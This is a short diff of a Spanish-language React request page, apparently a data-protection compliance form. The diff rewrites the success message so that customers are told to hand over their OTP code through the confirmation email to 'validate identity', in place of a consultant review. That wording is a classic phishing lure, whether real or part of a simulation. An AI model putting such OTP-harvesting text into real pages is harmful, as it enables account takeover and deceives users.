@@ -69,7 +69,7 @@ export default function Home() {
                 <div style={{ fontSize: "4rem", color: "var(--success)", marginBottom: "20px" }}>✓</div>
                 <h2>Solicitud Enviada</h2>
                 <p style={{ color: "var(--text-muted)", fontSize: "1.1rem" }}>
-                  Usuario <strong>{email}</strong>, los datos ingresados han sido validados correctamente y su solicitud ha sido ingresada a nuestro sistema
+                  Estimado cliente <strong>{email}</strong>, los datos ingresados han sido validados correctamente y su solicitud ha sido ingresada a nuestro sistema
                   de cumplimiento.
                 </p>
 
@@ -86,8 +86,8 @@ export default function Home() {
                   <p style={{ margin: 0, fontWeight: 600, color: "white" }}>Próximos pasos:</p>
                   <ul style={{ color: "var(--text-muted)", paddingLeft: "20px", fontSize: "0.9rem" }}>
                     <li>Recibirá un correo de confirmación en breve.</li>
-                    <li>Un consultor de Cybertrust revisará su requerimiento.</li>
-                    <li>Plazo máximo de respuesta: 15 días hábiles.</li>
+                    <li>Entregue su código OTP en el correo de confirmación para validar su identidad.</li>
+                    <li>Después de esta verificación nuestro Delegado de Protección de Datos manejará su requerimiento en breves momentos.</li>
                   </ul>
                 </div>
               </>
